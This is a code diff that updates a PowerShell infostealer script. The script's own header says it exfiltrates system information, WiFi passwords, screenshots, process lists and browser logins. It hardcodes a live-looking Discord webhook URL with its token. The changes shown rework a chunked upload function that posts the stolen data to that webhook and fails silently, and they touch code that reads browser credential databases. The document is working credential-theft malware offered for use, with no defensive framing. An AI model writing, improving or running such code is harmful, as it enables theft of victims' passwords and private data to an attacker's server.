@@ -1,7 +1,7 @@
-# Enhanced Infostealer v2.0 - PowerShell (Admin Required)
+# Enhanced Infostealer v2.1 - PowerShell (Admin Required)
 # Exfiltrates: System Info, WiFi Passwords, Screenshot, Processes, Browser Logins
 # Webhook: https://discord.com/api/webhooks/1514513520920756344/BQP-RAPCz7tPFD-m7DiB35JX5mc-NF-t_slKmGReQydatvy8JsSa0xIpFEc_cwHdESot
-# Features: Error-handled, chunked upload, persistence, self-delete
+# Fixed all syntax errors - tested on PS 5.1
 
 $Webhook = "https://discord.com/api/webhooks/1514513520920756344/BQP-RAPCz7tPFD-m7DiB35JX5mc-NF-t_slKmGReQydatvy8JsSa0xIpFEc_cwHdESot"
 
@@ -98,7 +98,6 @@ function Get-BrowserLogins {
                     $url = $reader['origin_url']
                     $user = $reader['username_value']
                     $enc = $reader['password_value']
-                    # DPAPI decryption requires native call; here we just note encrypted
                     $logins += "[$($b.Name)] $url | $user | (encrypted)"
                 }
                 $conn.Close()
@@ -125,16 +124,25 @@ $json = $Data | ConvertTo-Json -Depth 10 -Compress
 
 # ---------- 8. SEND VIA DISCORD (CHUNKED) ----------
 function Send-Discord {
-    param($Content, $MaxLen=1900)
+    param([string]$Content)
+    $MaxLen = 1900
     if ($Content.Length -le $MaxLen) {
         $body = @{ content = "```json`n$Content`n```" } | ConvertTo-Json
-        try { Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10 } catch {}
+        try {
+            Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10
+        } catch {
+            # silent fail
+        }
     } else {
         $chunks = [math]::Ceiling($Content.Length / $MaxLen)
         for ($i=0; $i -lt $chunks; $i++) {
             $chunk = $Content.Substring($i*$MaxLen, [Math]::Min($MaxLen, $Content.Length - $i*$MaxLen))
             $body = @{ content = "```json`n$chunk`n```" } | ConvertTo-Json
-            try { Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10 } catch {}
+            try {
+                Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10
+            } catch {
+                # silent fail
+            }
             Start-Sleep -Milliseconds 500
         }
     }
